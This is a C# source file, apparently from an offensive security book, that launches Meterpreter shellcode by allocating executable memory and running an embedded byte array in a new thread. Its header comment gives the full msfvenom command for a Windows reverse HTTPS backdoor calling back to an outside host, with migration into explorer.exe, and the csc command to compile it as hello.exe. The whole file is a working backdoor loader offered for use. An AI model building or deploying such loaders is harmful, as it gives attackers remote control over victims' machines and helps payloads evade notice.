using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

/*
 Meterpreter wrapper inspired by https://github.com/Arno0x/CSharpScripts/blob/master/shellcodeLauncher.cs
 Example payload command line to paste in byte[] var variable: 
 root@Kali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_winhttps LHOST=www.stratjumbo.co.au LPORT=443 prependmigrate=true prepenmigrateprocess=explorer.exe -f csharp
 
 Compile this C# wrapper using csc:
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /out:hello.exe .\msf_backdoor.cs
 
 PS: Change line 99 to suit your migration technique if you change the msfvenom command above.
 
 This wrapper was used in How to Hack Like a Legend book.
 
*/
namespace shellcode
{
    class Program
    {
        public static void Main()
        {
            byte[] var = new byte[838] {
            0xfc,0xe9,0x8a,0x00,0x00,0x00,0x5d,0x83,0xc5,0x0b,0x81,0xc4,0x70,0xfe,0xff,
0xff,0x8d,0x54,0x24,0x60,0x52,0x68,0xb1,0x4a,...,0xd5 };
            //Allocate memory with read write and execute flags
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)var.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            //Copy the buffer to memory
            Marshal.Copy(var, 0, (IntPtr)(funcAddr), var.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            //If prependmigrate=true in msfvenom, a wait value of 5000 ms should be sufficient for the main process to terminate after migration.
            WaitForSingleObject(hThread, 5000);

            return;
        }
        
        //Define static variables to be used in memory allocation
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        //Import VirtualAlloc frol kernel32.dll
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        //Import CreateThread frol kernel32.dll
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );
        //Import WaitForSingleObject frol kernel32.dll
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

    }
}
